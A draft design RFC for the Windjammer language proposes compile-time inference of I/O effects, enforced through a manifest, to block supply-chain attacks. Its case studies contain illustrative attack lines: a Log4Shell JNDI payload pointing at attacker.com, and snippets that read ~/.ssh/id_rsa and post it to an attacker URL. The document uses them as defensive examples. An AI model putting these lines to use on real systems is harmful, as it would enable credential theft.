# WJ-SEC-01: Inferred Effect Capabilities

**Status:** 🟡 Draft  
**Author:** Windjammer Team  
**Date:** 2026-03-21  
**Target:** v0.50  
**Priority:** High

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Problem Statement](#problem-statement)
3. [Solution: Inferred Effect Capabilities](#solution-inferred-effect-capabilities)
4. [Technical Design](#technical-design)
5. [Backend-Specific Implementation](#backend-specific-implementation)
6. [Case Studies](#case-studies)
7. [Implementation Phases](#implementation-phases)
8. [Alternatives Considered](#alternatives-considered)
9. [Open Questions](#open-questions)

---

## Executive Summary

**Goal:** Prevent supply chain attacks like Log4Shell by making I/O permissions explicit and enforceable at compile time.

**Core Idea:** The compiler automatically infers what system capabilities (file access, network, process spawning) each function requires. Applications declare allowed capabilities in a manifest (`wj.toml`). If a dependency attempts an operation not in the manifest, the build fails.

**Key Innovation:** Unlike Deno's runtime flags, Windjammer's effect system is **compile-time** for the Rust backend, catching security violations before deployment.

---

## Problem Statement

### The Ambient Authority Problem

In most programming languages, once a binary is compiled and executed, it has **full access** to all OS capabilities the user has:

- Read/write any file
- Make network connections to any host
- Spawn processes
- Access environment variables
- Execute arbitrary code

This creates **two critical vulnerabilities**:

#### 1. Supply Chain Attacks (The "Confused Deputy")

A library to parse JSON doesn't *need* network access, but **nothing prevents it** from secretly exfiltrating data.

**Real-World Example: Log4Shell (CVE-2021-44228)**

```java
// Vulnerable code
log.info("User-Agent: {}", request.getHeader("User-Agent"));

// Attacker sends:
// User-Agent: ${jndi:ldap://attacker.com/exploit}

// The logging library:
// 1. Has full network access (ambient authority)
// 2. Evaluates the JNDI string
// 3. Makes a network request to attacker.com
// 4. Downloads and executes malicious code
```

**Impact:** One of the most critical vulnerabilities in history. Affected millions of servers.

**Root Cause:** The logging library had **ambient authority** - it could make network requests even though its stated purpose was just writing log messages.

#### 2. Malicious Dependency Injection

```bash
# Developer runs:
npm install colors

# New maintainer uploads malicious version that:
# - Reads ~/.ssh/id_rsa
# - Sends to remote server
# - Deletes itself from disk
```

**Current State:** Most languages detect this **after** the attack succeeds (post-mortem analysis).

**Windjammer Goal:** Detect this **before** the binary is created (compile-time).

---

## Solution: Inferred Effect Capabilities

### Core Principles

1. **Automatic Inference** - The compiler tracks what I/O each function performs
2. **Application Manifest** - Apps declare allowed capabilities in `wj.toml`
3. **Compile-Time Enforcement** - Rust backend fails the build if capabilities don't match
4. **Library Transparency** - Libraries don't need manifests; their capabilities are exported as metadata
5. **Backend-Appropriate** - Rust gets compile-time safety, other backends get runtime checks

### Effect Categories

| Effect | Description | Example Operations |
|--------|-------------|-------------------|
| `<logic_only>` | Pure computation, no I/O | Math, string operations, pure algorithms |
| `<fs_read>` | Read files | `fs.read_file()`, `fs.list_dir()` |
| `<fs_write>` | Write/delete files | `fs.write_file()`, `fs.delete()` |
| `<net_egress>` | Outbound network | `http.post()`, `tcp.connect()` |
| `<net_ingress>` | Inbound network (servers) | `http.listen()`, `tcp.bind()` |
| `<env>` | Environment variables | `env.get()`, `env.set()` |
| `<spawn>` | Process spawning | `process.spawn()`, `shell.exec()` |
| `<eval>` | Dynamic code execution | `eval()`, `load_plugin()` |
| `<unsafe>` | Unsafe operations (Rust FFI) | Raw pointer access, FFI calls |

---

## Technical Design

### 1. Capability Manifest (`wj.toml`)

Applications declare allowed capabilities in their `wj.toml`:

```toml
[package]
name = "my-web-app"
version = "0.1.0"

[security]
# Tiered security modes
mode = "restrictive"  # permissive | restrictive | paranoid

# Filesystem access (glob patterns)
allow_fs_read = ["./config/*", "./data/*.json"]
allow_fs_write = ["./logs/*", "./tmp/*"]

# Network access (domains/IPs)
allow_net_egress = ["api.stripe.com", "api.github.com"]
allow_net_ingress = ["0.0.0.0:8080"]  # Web server

# Environment variables (whitelist)
allow_env = ["DATABASE_URL", "API_KEY"]

# Process spawning (allowlist commands)
allow_spawn = []  # No process spawning

# Code execution
allow_eval = false  # No dynamic code execution
```

#### Security Modes

**Permissive** (for scripts, prototypes):
```toml
[security]
mode = "permissive"
# All capabilities allowed by default
```

**Restrictive** (production default):
```toml
[security]
mode = "restrictive"
# Must explicitly allow each capability
allow_fs_read = ["./data/*"]
allow_net_egress = ["api.example.com"]
```

**Paranoid** (agent-generated code, plugins):
```toml
[security]
mode = "paranoid"
# Zero capabilities by default
# Even explicitly allowed ops are logged/audited
```

### 2. Automatic Effect Inference

The compiler analyzes function bodies to determine required effects:

```windjammer
// Example: JSON parsing library
pub fn parse_json(text: str) -> Result<Value, Error> {
    // Only uses string operations and memory allocation
    // Compiler infers: <logic_only>
    
    let tokens = tokenize(text)
    let ast = build_ast(tokens)
    Ok(ast)
}

// Example: Logger with file output
pub fn log(message: str) {
    // Uses fs.write_file internally
    // Compiler infers: <fs_write>
    
    let timestamp = format!("{}", now())
    fs.write_file("./logs/app.log", format!("{}: {}", timestamp, message))
}

// Example: Suspicious library
pub fn format_output(data: str) -> str {
    // Uses http.post internally!
    // Compiler infers: <net_egress>
    
    http.post("https://attacker.com/exfiltrate", data)  // 🚨 RED FLAG
    format!("Processed: {}", data)
}
```

**Key Point:** Developers don't annotate effects manually. The compiler discovers them automatically by analyzing which protected sinks are called.

### 3. Protected Sinks

The standard library marks sensitive operations as requiring specific capabilities:

```windjammer
// std/fs.wj
@requires(fs_read)
pub fn read_file(path: str) -> Result<str, Error> {
    // Implementation (Rust backend: calls std::fs::read_to_string)
}

@requires(fs_write)
pub fn write_file(path: str, contents: str) -> Result<(), Error> {
    // Implementation
}

// std/http.wj
@requires(net_egress)
pub fn post(url: str, body: str) -> Result<Response, Error> {
    // Implementation
}

// std/process.wj
@requires(spawn)
pub fn exec(cmd: str, args: List<str>) -> Result<Output, Error> {
    // Implementation
}
```

### 4. Compilation Process

```
1. Analyze all source files
   ├─> Function A calls fs.read_file → A requires <fs_read>
   ├─> Function B calls A → B requires <fs_read>
   └─> Transitive closure of effects

2. Check library dependencies
   ├─> Library "json-parser" metadata: requires <logic_only>
   ├─> Library "http-client" metadata: requires <net_egress>
   └─> Library "logger" metadata: requires <fs_write>

3. Validate against manifest
   ├─> App allows: <fs_read>, <fs_write>, <net_egress>
   ├─> "json-parser" needs: <logic_only> ✅ ALLOWED (subset)
   ├─> "http-client" needs: <net_egress> ✅ ALLOWED
   └─> "logger" needs: <fs_write> ✅ ALLOWED

4. Build or fail
   ├─> All capabilities satisfied → Generate binary
   └─> Unauthorized capability → COMPILE ERROR
```

---

## Backend-Specific Implementation

### Rust Backend (Compile-Time)

**Mechanism:** Newtype wrappers + marker traits

```rust
// Generated Rust code
pub struct FsReadToken(());
pub struct FsWriteToken(());
pub struct NetEgressToken(());

pub trait RequiresFsRead {
    fn with_fs_read<F, R>(f: F) -> R
    where
        F: FnOnce(FsReadToken) -> R;
}

// Protected sink
pub fn read_file(path: &str, _token: FsReadToken) -> Result<String, Error> {
    std::fs::read_to_string(path)
}

// Application with valid manifest gets tokens
fn main() {
    // Compiler inserts this based on wj.toml
    let fs_read_token = FsReadToken(());
    let fs_write_token = FsWriteToken(());
    
    // Can call protected function
    let config = read_file("./config.json", fs_read_token).unwrap();
    
    // This would fail compilation if net_egress not in manifest:
    // http::post("...", body, net_egress_token);
}
```

**Key:** Tokens are zero-cost at runtime (newtype over `()` compiles to nothing). Security is enforced purely at compile time.

### Go Backend (Runtime)

**Mechanism:** Runtime capability registry + checks

```go
// Generated Go code
type Capability int

const (
    FsRead Capability = 1 << iota
    FsWrite
    NetEgress
)

var allowedCapabilities Capability

func init() {
    // Set from manifest at startup
    allowedCapabilities = FsRead | FsWrite
}

func ReadFile(path string) (string, error) {
    if allowedCapabilities & FsRead == 0 {
        panic("Capability fs_read not allowed")
    }
    return os.ReadFile(path)
}
```

**Tradeoff:** Runtime overhead, but still prevents unauthorized I/O.

### JavaScript Backend (Runtime + CSP)

**Mechanism:** Content Security Policy + fetch restrictions

```javascript
// Generated JavaScript
const allowedCapabilities = {
    fsRead: ['/config/*', '/data/*.json'],
    netEgress: ['api.stripe.com']
};

async function readFile(path) {
    if (!matchesPattern(path, allowedCapabilities.fsRead)) {
        throw new Error(`Filesystem read denied: ${path}`);
    }
    return await fs.readFile(path);
}

async function httpPost(url, body) {
    if (!matchesDomain(url, allowedCapabilities.netEgress)) {
        throw new Error(`Network access denied: ${url}`);
    }
    return await fetch(url, { method: 'POST', body });
}
```

**CSP Header:**
```http
Content-Security-Policy: connect-src 'self' api.stripe.com; script-src 'self'
```

### Interpreter Backend (Runtime Prompts)

**Mechanism:** Permission prompts (Deno-style)

```
⚠️  Code requires filesystem read: ./data/users.json
   Allow? [y/N/always/never]
```

---

## Case Studies

### Case Study 1: Preventing Log4Shell

**Vulnerable Code (Java):**
```java
Logger log = LogManager.getLogger();
log.info("User-Agent: {}", request.getHeader("User-Agent"));
// Attacker sends: ${jndi:ldap://attacker.com/exploit}
```

**Windjammer Equivalent:**

```windjammer
// std/log.wj (logging library)
pub fn info(message: str) {
    let timestamp = format!("{}", now())
    fs.write_file("./logs/app.log", format!("{}: {}", timestamp, message))
    // Compiler infers: <fs_write>
}

// Malicious version tries to add:
pub fn info_with_lookup(message: str) {
    if message.contains("${jndi:") {
        let url = extract_url(message)
        http.get(url)  // 🚨 Compiler detects <net_egress>!
    }
    info(message)
}
```

**Application `wj.toml`:**
```toml
[security]
mode = "restrictive"
allow_fs_write = ["./logs/*"]
# Note: net_egress is NOT in the allowlist
```

**Result:**
```
Error: Capability violation
  --> std/log.wj:7:9
   |
 7 |         http.get(url)
   |         ^^^^^^^^^^^^^ requires <net_egress>
   |
   = note: Function 'info_with_lookup' requires <net_egress>
   = note: Application manifest does not allow <net_egress>
   = help: Add 'allow_net_egress = ["*"]' to wj.toml to allow (not recommended)
   = help: Review dependency: Why does a logging library need network access?
```

**Build fails. Attack prevented.**

### Case Study 2: Malicious Dependency

**Scenario:** A developer adds a "colors" library for terminal formatting. The maintainer is compromised and uploads a malicious version.

**Malicious Code:**
```windjammer
// colors.wj v2.0.0 (malicious update)
pub fn red(text: str) -> str {
    // Exfiltrate SSH keys
    let ssh_key = fs.read_file("~/.ssh/id_rsa")
    http.post("https://attacker.com/steal", ssh_key)
    
    // Return colored text to avoid suspicion
    format!("\x1b[31m{}\x1b[0m", text)
}
```

**Application Build:**
```bash
wj build --release
```

**Result:**
```
Error: Dependency capability violation
  --> colors.wj:3:5
   |
 3 |     let ssh_key = fs.read_file("~/.ssh/id_rsa")
   |                   ^^^^^^^^^^^^ requires <fs_read>
 4 |     http.post("https://attacker.com/steal", ssh_key)
   |     ^^^^^^^^^ requires <net_egress>
   |
   = note: Dependency 'colors' requires: <fs_read>, <net_egress>
   = note: Application manifest allows: <logic_only>
   = help: Review dependency source: Why does a color library need filesystem and network?
   = help: This is suspicious behavior for a terminal formatting library.
```

**Build fails. Attack prevented before binary is created.**

### Case Study 3: Safe Library Usage

**Scenario:** A web application uses legitimate libraries.

```windjammer
// main.wj
use std.http
use json_parser  // Pure library
use database    // Needs network

fn handle_request(req: Request) -> Response {
    let body = req.body
    let data = json_parser.parse(body)  // <logic_only>
    
    let result = database.query("SELECT * FROM users")  // <net_egress>
    
    http.respond(200, result)  // <net_ingress>
}

fn main() {
    http.listen("0.0.0.0:8080", handle_request)
}
```

**`wj.toml`:**
```toml
[security]
mode = "restrictive"
allow_net_ingress = ["0.0.0.0:8080"]
allow_net_egress = ["db.example.com:5432"]
```

**Dependency Analysis:**
- `json_parser`: requires `<logic_only>` ✅ (always allowed)
- `database`: requires `<net_egress>` ✅ (allowed to `db.example.com`)
- `std.http`: requires `<net_ingress>` ✅ (allowed on port 8080)

**Build succeeds. All capabilities legitimate and authorized.**

---

## Implementation Phases

### Phase 1: Foundation (v0.50)

**Goal:** Basic effect tracking and validation

**Deliverables:**
- [ ] Effect analysis pass in compiler (`analyzer/effects.rs`)
- [ ] `wj.toml` security section parsing
- [ ] Protected sinks in standard library (`@requires` annotation)
- [ ] Compile-time validation (Rust backend)
- [ ] Clear error messages for capability violations
- [ ] TDD: Test suite for effect inference

**Example:**
```bash
wj build
# Error: Function 'main' requires <net_egress> but manifest doesn't allow it
```

**Scope:**
- Binary effects only (file/network/process)
- Simple allowlists (no path patterns yet)
- Rust backend only

### Phase 2: Granularity (v0.52)

**Goal:** Path-specific and domain-specific restrictions

**Deliverables:**
- [ ] Glob pattern matching for filesystem (`./data/*.json`)
- [ ] Domain/IP allowlists for network (`api.github.com`, `192.168.1.0/24`)
- [ ] Effect refinement (`<fs_read:readonly>` vs `<fs_read:metadata>`)
- [ ] Transitive effect analysis for libraries
- [ ] Library metadata format (`.wj.meta` files)

**Example:**
```toml
allow_fs_read = ["./config/*.json", "~/.app/settings.toml"]
allow_net_egress = ["api.stripe.com:443", "webhooks.example.com"]
```

### Phase 3: Multi-Backend (v0.55)

**Goal:** Runtime enforcement for Go, JavaScript, Interpreter

**Deliverables:**
- [ ] Go backend capability registry
- [ ] JavaScript CSP generation
- [ ] Interpreter permission prompts
- [ ] Backend-specific error messages
- [ ] Cross-backend test suite

### Phase 4: Advanced Features (v0.60+)

**Goal:** Dynamic capabilities, delegation, auditing

**Deliverables:**
- [ ] Conditional capabilities (`allow_fs_write if cfg(debug)`)
- [ ] Capability delegation (`grant <net_egress> to plugin`)
- [ ] Audit logging (track actual vs declared usage)
- [ ] Capability refinement operators (`<fs_read> - <fs_read:/etc/*>`)
- [ ] Integration with OS-level sandboxing (seccomp, pledge)

---

## Alternatives Considered

### Alternative 1: Manual Annotations (Rejected)

**Approach:** Require developers to manually annotate functions with required effects.

```windjammer
@requires(fs_write, net_egress)
pub fn upload_logs() {
    let logs = fs.read_file("./logs/app.log")
    http.post("https://logs.example.com", logs)
}
```

**Why Rejected:**
- ❌ High ceremony (violates "compiler does the hard work")
- ❌ Error-prone (developers forget annotations)
- ❌ Not backend-agnostic (Go/JS don't have this concept)
- ❌ Conflicts with Windjammer's inference philosophy

### Alternative 2: Runtime-Only Checks (Rejected)

**Approach:** Check capabilities at runtime for all backends (Deno-style).

**Why Rejected:**
- ❌ Misses errors until code is executed
- ❌ Production failures (should fail at build time)
- ❌ Not "secure by default" (requires runtime setup)
- ✅ **However:** Used as fallback for Go/JS/Interpreter backends

### Alternative 3: OS-Level Sandboxing (Complementary)

**Approach:** Use seccomp (Linux), pledge (OpenBSD), or containerization.

**Why Complementary:**
- ✅ Defense in depth (OS + compiler)
- ✅ Can integrate with Windjammer's capability model
- ❌ Not portable (OS-specific)
- ❌ Coarse-grained (process-level, not function-level)

**Decision:** Windjammer's effect system is primary, OS sandboxing is optional additional layer.

---

## Open Questions

### 1. Dynamic Plugin Systems

**Question:** How do we handle plugins that are loaded at runtime?

**Options:**
- **A:** Require plugin manifest before loading (validate capabilities match)
- **B:** Capability delegation (`grant <fs_read> to plugin`)
- **C:** Sandboxed plugin execution (WASM with limited imports)

**Recommendation:** Start with A (manifest validation), add B in Phase 4.

### 2. Capability Refinement

**Question:** Should we support fine-grained capability modifiers?

**Examples:**
- `<fs_read:metadata>` - Only stat(), not read_file()
- `<fs_read:readonly>` - Can read but not modify file descriptors
- `<net_egress:dns>` - DNS queries only, no TCP/HTTP

**Recommendation:** Start simple (Phase 1: binary yes/no), add refinement in Phase 4 based on real-world needs.

### 3. Standard Library Scope

**Question:** What granularity for std effects?

**Examples:**
- Coarse: `std.fs` requires `<fs_read>` or `<fs_write>`
- Fine: `fs.read_file` requires `<fs_read>`, `fs.metadata` requires `<fs_metadata>`

**Recommendation:** Coarse for Phase 1, fine-grained opt-in for security-critical apps.

### 4. Third-Party Libraries

**Question:** How do we bootstrap the ecosystem?

**Options:**
- **A:** All libraries default to `<logic_only>`, must declare if they need I/O
- **B:** Infer from first compilation, save to `.wj.meta`
- **C:** Community-contributed capability annotations

**Recommendation:** B (auto-generate `.wj.meta` on first build), with A as fallback for safety.

---

## Security Considerations

### Escape Hatches

**Rust Backend:**
```windjammer
unsafe {
    // Bypass all capability checks (FFI only)
    extern_rust_function()
}
```

**Why Needed:** For Rust interop, performance-critical code, or OS-specific functionality.

**Safety:** `unsafe` blocks are audited separately, clearly marked in code.

### Transitive Dependencies

**Problem:** Dependency A is safe, but A depends on malicious B.

**Solution:**
- Analyze full dependency tree
- Report full capability chain: `A → B → <net_egress>`
- Allow developers to audit transitive capabilities

### False Positives

**Problem:** Library does conditional I/O that's actually safe.

**Example:**
```windjammer
pub fn debug_log(message: str) {
    if cfg!(debug) {
        fs.write_file("./debug.log", message)  // Only in debug builds
    }
}
```

**Solution:** Conditional capabilities (Phase 4):
```toml
[security]
allow_fs_write = ["./debug.log"]
only_in = "debug"
```

---

## Success Metrics

### Security Metrics

- **Zero Day Exploits:** Number of supply chain attacks prevented
- **Capability Violations:** Number of builds that fail due to unauthorized I/O
- **False Positive Rate:** Percentage of legitimate code flagged incorrectly

### Developer Experience Metrics

- **Time to Diagnose:** How quickly developers identify capability issues
- **Onboarding Time:** How long to understand the capability system
- **Migration Friction:** Effort to add manifests to existing projects

### Goals

- **Phase 1:** Catch 80% of Log4Shell-style vulnerabilities
- **Phase 2:** <5% false positive rate
- **Phase 3:** <10 minutes to add manifest to typical project

---

## References

- **Pony Reference Capabilities:** https://tutorial.ponylang.io/capabilities/
- **Deno Permissions:** https://deno.land/manual/basics/permissions
- **Rust Capabilities Research:** "Capabilities for Rust" (ACM PLAS 2021)
- **Log4Shell Analysis:** CVE-2021-44228 Technical Report
- **Ambient Authority Problem:** Mark Miller, "Capability Myths Demolished" (2003)

---

## Appendix: Effect Inference Algorithm

### Pseudocode

```
function infer_effects(func: Function) -> EffectSet:
    effects = {}
    
    for stmt in func.body:
        if stmt is FunctionCall:
            callee_effects = infer_effects(stmt.callee)
            effects = effects ∪ callee_effects
        
        if stmt is MethodCall:
            if stmt.method is ProtectedSink:
                effects = effects ∪ {stmt.method.required_capability}
    
    return effects

function validate_manifest(program: Program, manifest: Manifest):
    allowed = manifest.allowed_capabilities
    
    for func in program.functions:
        required = infer_effects(func)
        
        if not (required ⊆ allowed):
            violation = required - allowed
            error("Function '{}' requires {} but manifest only allows {}", 
                  func.name, violation, allowed)
```

### Complexity

- **Time:** O(n * m) where n = functions, m = average function calls per function
- **Space:** O(n) for memoization of effect sets
- **Optimizations:** 
  - Cache effect sets per function
  - Skip analysis for `<logic_only>` functions
  - Parallel analysis for independent modules

---

*This RFC establishes the foundation for Windjammer's "Secure-by-Design" framework. Feedback welcome on implementation strategy, phase priorities, and open questions.*
